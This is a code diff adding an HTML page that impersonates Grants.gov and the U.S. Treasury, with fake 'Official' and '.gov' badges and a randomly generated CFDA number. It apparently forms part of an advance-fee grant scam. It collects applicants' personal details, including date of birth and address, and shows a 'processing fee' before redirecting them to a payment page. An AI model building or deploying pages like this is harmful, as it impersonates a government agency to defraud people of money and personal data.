@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply for Grant | Grants.gov Official</title>
+    
+    <!-- Official USWDS Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700;900&family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        /* ===== OFFICIAL U.S. GOVERNMENT STYLING ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f0f0;
+            color: #1b1b1b;
+            line-height: 1.5;
+        }
+
+        /* === USA Flag Banner === */
+        .usa-banner {
+            background-color: #f0f0f0;
+            font-size: 14px;
+            padding: 8px 0;
+            border-bottom: 1px solid #d9d9d9;
+        }
+
+        .banner-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .usa-flag {
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(180deg, #b22234 0%, #b22234 50%, #ffffff 50%, #ffffff 100%);
+            border: 1px solid #0a0a0a;
+        }
+
+        .banner-text strong {
+            font-weight: 700;
+        }
+
+        .dot-gov {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .dot-gov span {
+            background: #1b1b1b;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        /* === Header === */
+        .usa-header {
+            background: #112f4e;
+            color: white;
+            border-bottom: 4px solid #b22234;
+        }
+
+        .header-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .official-seal {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #112f4e;
+            font-size: 24px;
+            border: 2px solid #b22234;
+        }
+
+        .agency-name h1 {
+            font-family: 'Merriweather', serif;
+            font-size: 22px;
+            font-weight: 700;
+            color: white;
+        }
+
+        .agency-name .gov-domain {
+            font-size: 12px;
+            color: #ffd700;
+            display: block;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white;
+        }
+
+        .user-info i {
+            color: #ffd700;
+        }
+
+        .logout-btn {
+            background: transparent;
+            border: 1px solid white;
+            color: white;
+            padding: 5px 15px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .logout-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        /* === Progress Bar === */
+        .progress-section {
+            background: white;
+            border-bottom: 1px solid #d9d9d9;
+        }
+
+        .progress-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 25px 20px;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e5e5e5;
+            z-index: 1;
+        }
+
+        .step {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            flex: 1;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border: 2px solid #e5e5e5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: 700;
+            color: #5c5c5c;
+        }
+
+        .step.active .step-circle {
+            background: #112f4e;
+            border-color: #112f4e;
+            color: white;
+        }
+
+        .step.completed .step-circle {
+            background: #b22234;
+            border-color: #b22234;
+            color: white;
+        }
+
+        .step-label {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .step.active .step-label {
+            color: #112f4e;
+        }
+
+        /* === Main Container === */
+        .main-container {
+            max-width: 1280px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+        }
+
+        /* === Application Form === */
+        .application-card {
+            background: white;
+            border: 1px solid #d9d9d9;
+            padding: 30px;
+        }
+
+        .section-title {
+            font-family: 'Merriweather', serif;
+            font-size: 20px;
+            color: #112f4e;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #b22234;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #1b1b1b;
+        }
+
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #d9d9d9;
+            font-size: 16px;
+            font-family: 'Source Sans Pro', sans-serif;
+            transition: all 0.2s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            border-color: #112f4e;
+            outline: none;
+        }
+
+        .form-group input.error {
+            border-color: #b22234;
+            background: #fff5f5;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .input-hint {
+            font-size: 13px;
+            color: #5c5c5c;
+            margin-top: 5px;
+        }
+
+        /* === Grant Summary === */
+        .summary-card {
+            background: white;
+            border: 1px solid #d9d9d9;
+            padding: 30px;
+            position: sticky;
+            top: 20px;
+        }
+
+        .grant-badge {
+            background: #112f4e;
+            color: white;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .grant-badge h3 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .grant-badge .cfda {
+            font-size: 13px;
+            opacity: 0.8;
+        }
+
+        .amount-box {
+            background: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px dashed #b22234;
+        }
+
+        .amount-box .label {
+            font-size: 14px;
+            color: #5c5c5c;
+        }
+
+        .amount-box .number {
+            font-family: 'Merriweather', serif;
+            font-size: 36px;
+            font-weight: 700;
+            color: #b22234;
+        }
+
+        .fee-box {
+            background: #fff5f5;
+            padding: 15px;
+            border-left: 4px solid #b22234;
+            margin-bottom: 20px;
+        }
+
+        .fee-box .label {
+            font-size: 14px;
+            color: #5c5c5c;
+        }
+
+        .fee-box .amount {
+            font-size: 24px;
+            font-weight: 700;
+            color: #b22234;
+        }
+
+        .info-list {
+            list-style: none;
+            margin: 20px 0;
+        }
+
+        .info-list li {
+            padding: 10px 0;
+            border-bottom: 1px solid #e5e5e5;
+            display: flex;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .info-list li i {
+            color: #112f4e;
+            width: 20px;
+        }
+
+        /* === Buttons === */
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #b22234;
+            color: white;
+            border: none;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #8b1a1a;
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #112f4e;
+            border: 2px solid #112f4e;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .btn-secondary:hover {
+            background: #112f4e;
+            color: white;
+        }
+
+        /* === Messages === */
+        .message {
+            padding: 15px;
+            margin-bottom: 25px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .message.error {
+            background: #fef2f2;
+            border-left: 4px solid #b22234;
+            color: #b22234;
+        }
+
+        .message.success {
+            background: #f0fdf4;
+            border-left: 4px solid #10b981;
+            color: #10b981;
+        }
+
+        /* === No Grant Message === */
+        .no-grant-card {
+            background: white;
+            border: 1px solid #d9d9d9;
+            padding: 60px 40px;
+            text-align: center;
+            grid-column: span 2;
+        }
+
+        .no-grant-card i {
+            font-size: 60px;
+            color: #b22234;
+            margin-bottom: 20px;
+        }
+
+        .no-grant-card h2 {
+            font-family: 'Merriweather', serif;
+            font-size: 24px;
+            color: #112f4e;
+            margin-bottom: 15px;
+        }
+
+        /* === Footer === */
+        .usa-footer {
+            background: #112f4e;
+            color: white;
+            margin-top: 60px;
+            border-top: 4px solid #b22234;
+        }
+
+        .footer-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #ffd700;
+        }
+
+        /* === Responsive === */
+        @media (max-width: 900px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- USA BANNER -->
+    <div class="usa-banner">
+        <div class="banner-content">
+            <div class="usa-flag"></div>
+            <div class="banner-text">
+                <strong>An official website of the United States government</strong>
+            </div>
+            <div class="dot-gov">
+                <i class="fas fa-lock"></i> .gov
+                <span>Official</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="usa-header">
+        <div class="header-content">
+            <div class="logo-area">
+                <div class="official-seal">
+                    <i class="fas fa-eagle"></i>
+                </div>
+                <div class="agency-name">
+                    <h1>Grants.gov</h1>
+                    <span class="gov-domain">U.S. Department of Treasury</span>
+                </div>
+            </div>
+            <div class="user-info" id="userInfo">
+                <i class="fas fa-user-circle"></i>
+                <span id="userName">Loading...</span>
+                <button class="logout-btn" onclick="logout()">Sign Out</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- PROGRESS BAR -->
+    <div class="progress-section">
+        <div class="progress-container">
+            <div class="progress-steps">
+                <div class="step active">
+                    <div class="step-circle">1</div>
+                    <div class="step-label">Application</div>
+                </div>
+                <div class="step">
+                    <div class="step-circle">2</div>
+                    <div class="step-label">Payment</div>
+                </div>
+                <div class="step">
+                    <div class="step-circle">3</div>
+                    <div class="step-label">Account</div>
+                </div>
+                <div class="step">
+                    <div class="step-circle">4</div>
+                    <div class="step-label">Confirmation</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-container" id="mainContent">
+        <!-- This will be populated by JavaScript -->
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="usa-footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Accessibility</a>
+                <a href="#">FOIA</a>
+                <a href="#">Contact Us</a>
+            </div>
+            <div>
+                <i class="fas fa-flag-usa" style="color: #b22234; margin-right: 8px;"></i>
+                U.S. Department of Treasury · An official website of the United States government
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ===== CHECK LOGIN STATUS =====
+        document.addEventListener('DOMContentLoaded', function() {
+            const isLoggedIn = localStorage.getItem('grantsLoggedIn') === 'true';
+            const userName = localStorage.getItem('grantsName');
+            
+            if (!isLoggedIn) {
+                window.location.href = 'auth.html';
+                return;
+            }
+            
+            document.getElementById('userName').textContent = userName || 'Applicant';
+            
+            // Check if grant is selected
+            const selectedGrant = localStorage.getItem('selectedGrant');
+            const grantAmount = localStorage.getItem('grantAmount');
+            const processingFee = localStorage.getItem('processingFee');
+            
+            if (!selectedGrant) {
+                showNoGrantSelected();
+            } else {
+                showApplicationForm(selectedGrant, grantAmount, processingFee);
+            }
+        });
+
+        // ===== LOGOUT FUNCTION =====
+        function logout() {
+            localStorage.removeItem('grantsLoggedIn');
+            localStorage.removeItem('grantsName');
+            localStorage.removeItem('grantsEmail');
+            window.location.href = 'auth.html';
+        }
+
+        // ===== SHOW NO GRANT SELECTED =====
+        function showNoGrantSelected() {
+            const mainContent = document.getElementById('mainContent');
+            mainContent.innerHTML = `
+                <div class="no-grant-card">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <h2>No Grant Selected</h2>
+                    <p style="color: #5c5c5c; margin-bottom: 30px;">Please select a grant program from the homepage before applying.</p>
+                    <button class="btn-primary" onclick="window.location.href='index.html'" style="width: auto; padding: 12px 40px;">
+                        Browse Grants <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
+                    </button>
+                </div>
+            `;
+        }
+
+        // ===== SHOW APPLICATION FORM =====
+        function showApplicationForm(grantName, grantAmount, processingFee) {
+            const formattedAmount = parseInt(grantAmount || '0').toLocaleString();
+            const formattedFee = parseInt(processingFee || '0').toLocaleString();
+            
+            const mainContent = document.getElementById('mainContent');
+            mainContent.innerHTML = `
+                <!-- APPLICATION FORM -->
+                <div class="application-card">
+                    <h2 class="section-title">Grant Application Form</h2>
+                    
+                    <div id="errorMessage" class="message error">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="errorText"></span>
+                    </div>
+                    
+                    <form id="applicationForm">
+                        <h3 style="margin: 20px 0 15px;">Personal Information</h3>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>First Name</label>
+                                <input type="text" id="firstName" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Last Name</label>
+                                <input type="text" id="lastName" required>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Email Address</label>
+                            <input type="email" id="email" value="${localStorage.getItem('grantsEmail') || ''}" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Phone Number</label>
+                            <input type="tel" id="phone" placeholder="(555) 555-5555" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Date of Birth</label>
+                            <input type="date" id="dob" required>
+                        </div>
+                        
+                        <h3 style="margin: 30px 0 15px;">Address Information</h3>
+                        
+                        <div class="form-group">
+                            <label>Street Address</label>
+                            <input type="text" id="address" required>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>City</label>
+                                <input type="text" id="city" required>
+                            </div>
+                            <div class="form-group">
+                                <label>State</label>
+                                <select id="state" required>
+                                    <option value="">Select State</option>
+                                    <option value="AL">Alabama</option>
+                                    <option value="AK">Alaska</option>
+                                    <option value="AZ">Arizona</option>
+                                    <option value="AR">Arkansas</option>
+                                    <option value="CA">California</option>
+                                    <option value="CO">Colorado</option>
+                                    <option value="CT">Connecticut</option>
+                                    <option value="DE">Delaware</option>
+                                    <option value="FL">Florida</option>
+                                    <option value="GA">Georgia</option>
+                                    <option value="HI">Hawaii</option>
+                                    <option value="ID">Idaho</option>
+                                    <option value="IL">Illinois</option>
+                                    <option value="IN">Indiana</option>
+                                    <option value="IA">Iowa</option>
+                                    <option value="KS">Kansas</option>
+                                    <option value="KY">Kentucky</option>
+                                    <option value="LA">Louisiana</option>
+                                    <option value="ME">Maine</option>
+                                    <option value="MD">Maryland</option>
+                                    <option value="MA">Massachusetts</option>
+                                    <option value="MI">Michigan</option>
+                                    <option value="MN">Minnesota</option>
+                                    <option value="MS">Mississippi</option>
+                                    <option value="MO">Missouri</option>
+                                    <option value="MT">Montana</option>
+                                    <option value="NE">Nebraska</option>
+                                    <option value="NV">Nevada</option>
+                                    <option value="NH">New Hampshire</option>
+                                    <option value="NJ">New Jersey</option>
+                                    <option value="NM">New Mexico</option>
+                                    <option value="NY">New York</option>
+                                    <option value="NC">North Carolina</option>
+                                    <option value="ND">North Dakota</option>
+                                    <option value="OH">Ohio</option>
+                                    <option value="OK">Oklahoma</option>
+                                    <option value="OR">Oregon</option>
+                                    <option value="PA">Pennsylvania</option>
+                                    <option value="RI">Rhode Island</option>
+                                    <option value="SC">South Carolina</option>
+                                    <option value="SD">South Dakota</option>
+                                    <option value="TN">Tennessee</option>
+                                    <option value="TX">Texas</option>
+                                    <option value="UT">Utah</option>
+                                    <option value="VT">Vermont</option>
+                                    <option value="VA">Virginia</option>
+                                    <option value="WA">Washington</option>
+                                    <option value="WV">West Virginia</option>
+                                    <option value="WI">Wisconsin</option>
+                                    <option value="WY">Wyoming</option>
+                                </select>
+                            </div>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>ZIP Code</label>
+                                <input type="text" id="zip" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Country</label>
+                                <input type="text" id="country" value="United States" readonly>
+                            </div>
+                        </div>
+                        
+                        <h3 style="margin: 30px 0 15px;">Grant Purpose</h3>
+                        
+                        <div class="form-group">
+                            <label>Purpose of Funds</label>
+                            <textarea id="purpose" rows="4" placeholder="Please describe how you plan to use the grant funds..." required></textarea>
+                        </div>
+                        
+                        <div style="margin: 30px 0;">
+                            <label style="display: flex; align-items: center; gap: 10px;">
+                                <input type="checkbox" id="terms" required>
+                                <span>I certify that all information provided is true and accurate. I understand that providing false information may result in legal penalties under 18 U.S.C. § 1001.</span>
+                            </label>
+                        </div>
+                        
+                        <button type="submit" class="btn-primary" id="submitBtn">
+                            Submit Application & Continue to Payment
+                        </button>
+                    </form>
+                </div>
+                
+                <!-- GRANT SUMMARY -->
+                <div class="summary-card">
+                    <div class="grant-badge">
+                        <h3 id="summaryGrantName">${grantName}</h3>
+                        <div class="cfda" id="summaryCFDA">CFDA #${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 1000)}</div>
+                    </div>
+                    
+                    <div class="amount-box">
+                        <div class="label">Grant Amount</div>
+                        <div class="number" id="summaryAmount">$${formattedAmount}</div>
+                    </div>
+                    
+                    <div class="fee-box">
+                        <div class="label">Processing Fee</div>
+                        <div class="amount" id="summaryFee">$${formattedFee}</div>
+                    </div>
+                    
+                    <ul class="info-list">
+                        <li><i class="fas fa-clock"></i> Estimated processing time: 24-48 hours</li>
+                        <li><i class="fas fa-lock"></i> Secure application</li>
+                        <li><i class="fas fa-file"></i> Form SF-424 (Auto-generated)</li>
+                    </ul>
+                    
+                    <div style="background: #f8f8f8; padding: 15px; font-size: 13px;">
+                        <i class="fas fa-info-circle" style="color: #112f4e;"></i>
+                        Your application will be reviewed by the granting agency. The processing fee covers administrative costs.
+                    </div>
+                </div>
+            `;
+
+            // Add form submit handler
+            document.getElementById('applicationForm').addEventListener('submit', submitApplication);
+        }
+
+        // ===== SHOW MESSAGE =====
+        function showMessage(message, type) {
+            const errorMsg = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+            
+            if (errorMsg && errorText) {
+                errorText.textContent = message;
+                errorMsg.style.display = 'flex';
+                errorMsg.className = `message ${type}`;
+                
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 4000);
+            }
+        }
+
+        // ===== SUBMIT APPLICATION =====
+        function submitApplication(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const dob = document.getElementById('dob').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
+            const zip = document.getElementById('zip').value;
+            const purpose = document.getElementById('purpose').value;
+            const terms = document.getElementById('terms').checked;
+            
+            // Validate
+            if (!firstName || !lastName || !email || !phone || !dob || !address || !city || !state || !zip || !purpose) {
+                showMessage('Please fill in all required fields', 'error');
+                return;
+            }
+            
+            if (!email.includes('@') || !email.includes('.')) {
+                showMessage('Please enter a valid email address', 'error');
+                return;
+            }
+            
+            if (!terms) {
+                showMessage('You must certify that the information is true', 'error');
+                return;
+            }
+            
+            // Get grant data
+            const grantName = localStorage.getItem('selectedGrant');
+            const grantAmount = localStorage.getItem('grantAmount');
+            const processingFee = localStorage.getItem('processingFee');
+            
+            // Save application data
+            const applicationData = {
+                firstName,
+                lastName,
+                fullName: `${firstName} ${lastName}`,
+                email,
+                phone,
+                dob,
+                address,
+                city,
+                state,
+                zip,
+                purpose,
+                grantName,
+                grantAmount,
+                processingFee,
+                applicationDate: new Date().toISOString(),
+                applicationId: 'GR-' + Math.floor(Math.random() * 1000000)
+            };
+            
+            localStorage.setItem('applicationData', JSON.stringify(applicationData));
+            localStorage.setItem('applicationStep', '2');
+            
+            // Show loading
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            btn.disabled = true;
+            
+            // Redirect to payment
+            setTimeout(() => {
+                window.location.href = 'payment.html';
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
